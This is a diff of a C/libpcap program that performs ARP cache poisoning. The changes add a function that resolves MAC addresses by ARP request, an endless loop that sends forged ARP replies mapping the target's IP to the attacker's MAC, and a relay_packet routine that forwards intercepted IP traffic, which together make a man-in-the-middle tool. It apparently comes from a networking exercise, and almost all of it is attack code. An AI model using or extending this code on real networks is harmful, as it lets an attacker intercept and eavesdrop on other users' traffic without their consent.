@@ -28,25 +28,24 @@ struct arphdr{
 	uint8_t tar_ip[4];
 };
 
-struct base_info{
-	u_char dev[10];
-	u_char sdr_ip[20];
-	u_char tar_ip[20];
-	uint8_t my_ip[INET_ADDRSTRLEN];
-	uint8_t my_mac[6];
-	uint8_t sdr_mac[6];
+struct host_info{
+	u_char ip[20];
+	uint8_t mac[6];
 };
 
 
 void Init_arp(struct arphdr *arp, uint16_t opcode);
-int Get_my_info(struct base_info *info);
-int Get_sender_hwaddr(struct base_info *info);
-void Send_poisoned_arp(struct base_info *info);
-
+int Get_my_info(u_char *dev, struct host_info *host);
+int Get_hwaddr_by_ip(u_char *dev, struct host_info *my, struct host_info *tar);
+void Send_poisoned_arp(u_char *dev, struct host_info *my, struct host_info *sdr, struct host_info *tar);
+int relay_packet(u_char *dev, struct host_info *my, struct host_info *tar);
 
 int main(int argc, char *argv[])
 {
-	struct base_info info;
+	struct host_info my;
+	struct host_info sdr;
+	struct host_info tar;
+	u_char dev[10];
 	int i;
 
 	if (argc != 4) {
@@ -54,17 +53,20 @@ int main(int argc, char *argv[])
 		return 2;
 	}
 
-	strcpy(info.dev, argv[1]);
-	strcpy(info.sdr_ip, argv[2]);
-	strcpy(info.tar_ip, argv[3]);
+	strcpy(dev, argv[1]);
+	strcpy(sdr.ip, argv[2]);
+	strcpy(tar.ip, argv[3]);
 
-	if (!Get_my_info(&info))
+	if (!Get_my_info(dev, &my))
 		return -1;
 
-	if (!Get_sender_hwaddr(&info))
+	if (!Get_hwaddr_by_ip(dev, &my, &sdr))
 		return -1;
 
-	Send_poisoned_arp(&info);
+	if (!Get_hwaddr_by_ip(dev, &my, &tar))
+		return -1;
+
+	Send_poisoned_arp(dev, &my, &sdr, &tar);
 	
 	return(0);
 }
@@ -80,7 +82,7 @@ void Init_arp(struct arphdr *arp, uint16_t opcode)
 }
 
 
-int Get_my_info(struct base_info *info)
+int Get_my_info(u_char *dev, struct host_info *my)
 {
 	FILE *fp;
 	int i;
@@ -90,23 +92,24 @@ int Get_my_info(struct base_info *info)
 
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 	ifr.ifr_addr.sa_family = AF_INET;
-	strncpy(ifr.ifr_name, info->dev, IFNAMSIZ-1);
+	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
 
 	/* Get my IP addr */
 	ioctl(fd, SIOCGIFADDR, &ifr);	
-	inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), info->my_ip, INET_ADDRSTRLEN);
+	inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), my->ip, INET_ADDRSTRLEN);
 	
 	/* Get my mac addr */
 	ioctl(fd, SIOCGIFHWADDR, &ifr);
 	for (i=0 ; i<6 ; i++)
-		info->my_mac[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
-	
+		my->mac[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
+
 	close(fd);
 	return 1;
 }
 
 
-int Get_sender_hwaddr(struct base_info *info)
+/* Get HW address of tar */
+int Get_hwaddr_by_ip(u_char *dev, struct host_info *my, struct host_info *tar)
 {
 	pcap_t *handle;			/* Session handle */
 	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
@@ -117,6 +120,7 @@ int Get_sender_hwaddr(struct base_info *info)
 	unsigned char send[50] = {0};	/* Buffer to send */
 	unsigned char *recv;		/* Buffer to recv */
 	uint32_t i;
+	uint32_t cnt;
 	uint32_t res;
 	struct ethhdr ether;
 	struct ethhdr *recv_ether;
@@ -125,26 +129,26 @@ int Get_sender_hwaddr(struct base_info *info)
 
 
 	/* Open the session in promiscuous mode */
-	handle = pcap_open_live(info->dev, 65536, 0, 1000, errbuf);
+	handle = pcap_open_live(dev, 65536, 0, 1000, errbuf);
 	if (handle == NULL) {
-		fprintf(stderr, "Couldn't open device %s: %s\n", info->dev, errbuf);
-		return(2);
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return(0);
 	}
 
 	/* Compile and apply the filter */
 	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
 		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
-		return(2);
+		return(0);
 	}
 	if (pcap_setfilter(handle, &fp) == -1) {
 		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
-		return(2);
+		return(0);
 	}
 
 
 	/* set ethernet header */
 	for (i=0 ; i<6 ; i++)
-		ether.h_source[i] = info->my_mac[i];
+		ether.h_source[i] = my->mac[i];
 	for (i=0 ; i<6 ; i++)
 		ether.h_dest[i] = 0xff;
 	ether.h_proto = htons(ETHERTYPE_ARP);
@@ -152,23 +156,24 @@ int Get_sender_hwaddr(struct base_info *info)
 
 	/* set arp header */
 	Init_arp(&arp, ARP_REQUEST);
-	inet_pton(AF_INET, info->my_ip, &arp.sdr_ip);
-	inet_pton(AF_INET, info->sdr_ip, &arp.tar_ip);
+	inet_pton(AF_INET, my->ip, &arp.sdr_ip);
+	inet_pton(AF_INET, tar->ip, &arp.tar_ip);
 	for (i=0 ; i<6 ; i++)
-		arp.sdr_mac[i] = info->my_mac[i];
+		arp.sdr_mac[i] = my->mac[i];
 	for (i=0 ; i<6 ; i++)
 		arp.tar_mac[i] = 0x00;
 	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));
 
 
-	while(1) {
+	//while(1) {
+	for (cnt=0 ; cnt<10 ; cnt++) {
 		/* Send arp request to sender */
 		if (pcap_sendpacket(handle, send, 42))
 		{
 			fprintf(stderr, "Couldn't send packet\n");
 			return 0;
 		}
-
+		printf("Send ARP request to %s\n", tar->ip);
 		/* Recv arp reply */
 		res = pcap_next_ex(handle, &header, (const u_char**)&recv);
 		if (res==0)
@@ -183,21 +188,28 @@ int Get_sender_hwaddr(struct base_info *info)
 		if (ntohs(recv_ether->h_proto) == ETHERTYPE_ARP)
 		{
 			recv_arp = (struct arphdr*)(recv + 14);
-			if (ntohs(recv_arp->opcode) == ARP_REPLY)
+			if (ntohs(recv_arp->opcode) == ARP_REPLY && *(uint32_t*)arp.tar_ip == *(uint32_t*)recv_arp->sdr_ip)
 			{
-				printf("Get ARP Reply\n");
+				printf("Get ARP Reply from %s\n", inet_ntoa(*(struct in_addr*)recv_arp->sdr_ip));
 				for (i=0 ; i<6 ; i++)
-					info->sdr_mac[i] = recv_arp->sdr_mac[i];
+					tar->mac[i] = recv_arp->sdr_mac[i];
 				break;
 			}
 		}
 	}
 	pcap_close(handle);
+	if (cnt == 10)
+	{
+		fprintf(stderr, "Couldn't recv reply (timeout)\n");
+		return 0;
+	}
+
 	return 1;
 }
 
 
-void Send_poisoned_arp(struct base_info *info)
+/* spoof sdr's arp table : [tar_ip]-[my_mac] */
+void Send_poisoned_arp(u_char *dev, struct host_info *my, struct host_info *sdr, struct host_info *tar)
 {
 	pcap_t *handle;			/* Session handle */
 	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
@@ -207,29 +219,32 @@ void Send_poisoned_arp(struct base_info *info)
 	struct arphdr arp;
 
 	/* Open the session in promiscuous mode */
-	handle = pcap_open_live(info->dev, 65536, 0, 1000, errbuf);
+	handle = pcap_open_live(dev, 65536, 0, 1000, errbuf);
 	if (handle == NULL) {
-		fprintf(stderr, "Couldn't open device %s: %s\n", info->dev, errbuf);
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
 		return;
 	}
 
 	/* set ethernet header */
 	for (i=0 ; i<6 ; i++)
-		ether.h_source[i] = info->my_mac[i];
+		ether.h_source[i] = my->mac[i];
 	for (i=0 ; i<6 ; i++)
-		ether.h_dest[i] = info->sdr_mac[i];
+		ether.h_dest[i] = sdr->mac[i];
 	ether.h_proto = htons(ETHERTYPE_ARP);
 	memcpy(send, (char*)&ether, 14);
 
 	/* set arp header */
 	Init_arp(&arp, ARP_REPLY);
-	inet_pton(AF_INET, info->tar_ip, &arp.sdr_ip);
-	inet_pton(AF_INET, info->sdr_ip, &arp.tar_ip);
+	inet_pton(AF_INET, tar->ip, &arp.sdr_ip);
+	inet_pton(AF_INET, sdr->ip, &arp.tar_ip);
 	for (i=0 ; i<6 ; i++)
-		arp.sdr_mac[i] = info->my_mac[i];
+		arp.sdr_mac[i] = my->mac[i];
 	for (i=0 ; i<6 ; i++)
-		arp.tar_mac[i] = info->sdr_mac[i];
+		arp.tar_mac[i] = sdr->mac[i];
 	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));
+
+	printf("tar : %s\n", tar->ip);
+	printf("sdr : %s\n", sdr->ip);
 
 	while (1)
 	{
@@ -244,6 +259,69 @@ void Send_poisoned_arp(struct base_info *info)
 	}
 }
 
+
+
+int relay_packet(u_char *dev, struct host_info *my, struct host_info *tar)
+{
+	pcap_t *handle;			/* Session handle */
+	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
+	struct bpf_program fp;		/* The compiled filter */
+	struct pcap_pkthdr *header;	/* The header that pcap gives us */
+	bpf_u_int32 net;		/* Our IP */
+	char filter_exp[] = "ip";	/* The filter expression */
+	unsigned char *packet;		/* Buffer to recv */
+	struct ethhdr *recv_ether;
+	uint32_t res;
+	uint32_t i;
+
+
+	/* Open the session in promiscuous mode */
+	handle = pcap_open_live(dev, 65536, 0, 1, errbuf);
+	if (handle == NULL) {
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return(0);
+	}
+
+	/* Compile and apply the filter */
+	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
+		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(0);
+	}
+	if (pcap_setfilter(handle, &fp) == -1) {
+		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(0);
+	}
+
+	while(1) {
+		res = pcap_next_ex(handle, &header, (const u_char**)&packet);
+		if (res==0)
+			continue;
+		else if (res==-1)
+		{
+			fprintf(stderr, "Couldn't recv packet\n");
+			return 0;
+		}
+
+		recv_ether = (struct ethhdr*)packet;
+		if (recv_ether->h_proto != ETHERTYPE_IP)
+			continue;
+
+		/* change ethernet header info */
+		
+		for (i=0 ; i<6 ; i++)
+			recv_ether->h_source[i] = my->mac[i];
+		for (i=0 ; i<6 ; i++)
+			recv_ether->h_dest[i] = tar->mac[i];
+
+		/* Relay IP packet */
+		if (pcap_sendpacket(handle, packet, 42))
+		{
+			fprintf(stderr, "Couldn't send packet\n");
+			return 0;
+		}
+	}
+	return 1;
+}
 
 /*
 * attacker	- me
